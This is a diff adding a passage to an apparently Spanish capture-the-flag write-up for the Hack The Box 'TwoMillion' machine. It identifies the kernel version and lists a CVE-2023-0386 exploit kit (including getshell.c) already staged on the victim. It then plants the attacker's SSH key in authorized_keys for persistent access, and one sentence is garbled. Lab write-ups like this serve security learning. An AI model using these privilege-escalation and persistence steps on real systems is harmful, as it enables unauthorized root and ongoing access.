@@ -432,3 +432,53 @@ HTB Godfather  </code>
 
 </pre>
 
+Habla de que hay que parchear el sistema operativo y menciona una super instalacion CVEFUSE
+
+## Identificar la vulnerabilidad
+TwoMillion está ejecutando Ubuntu 22.04 con el núcleo 5.15.70:
+
+<pre 
+  class="command-line" 
+  data-prompt="kali@kali $" 
+  data-output="4"
+><code class="language-bash"># Bash script with shell
+uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+admin@2million:/var/mail$   </code>
+</pre>
+
+Una búsqueda de la vulnerabilidad del núcleo de Linux superponer los superáfos limitados al último año devuelve un montón de cosas sobre CVE-2023-0386:
+
+La herramienta ya la teniamos descragada e instalada en un directorio de admin
+
+
+<pre 
+  class="command-line" 
+  data-prompt="kali@kali $" 
+  data-output="4"
+><code class="language-bash"># Bash script with shell
+ls
+CVE-2023-0386  CVE-2023-0386.tar  user.txt
+admin@2million:~$ cd CVE-2023-0386/
+admin@2million:~/CVE-2023-0386$ ls
+exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
+admin@2million:~/CVE-2023-0386$  </code>
+</pre>
+
+Para crear una 2da ventana mas facil crea un authorized keys ssh asi te conecas las veces que quieras
+Copiamos nuestra clave ssh en nestra clipboard(esto en nuestra maquina atacante)
+```bash
+ cat ~/.ssh/id_ed25519.pub | tr -d '\n' | xclip -sel clip              
+```
+En nuestra maquina victima la pegamos en el archivo que creemos
+
+<pre 
+  class="command-line" 
+  data-prompt="kali@kali $" 
+  data-output="4"
+><code class="language-bash"># Bash script with shell
+admin@2million:~$ cd .ssh
+admin@2million:~/.ssh$ ls
+authorized_keys
+admin@2million:~/.ssh$ nano authorized_keys  </code>
+</pre>
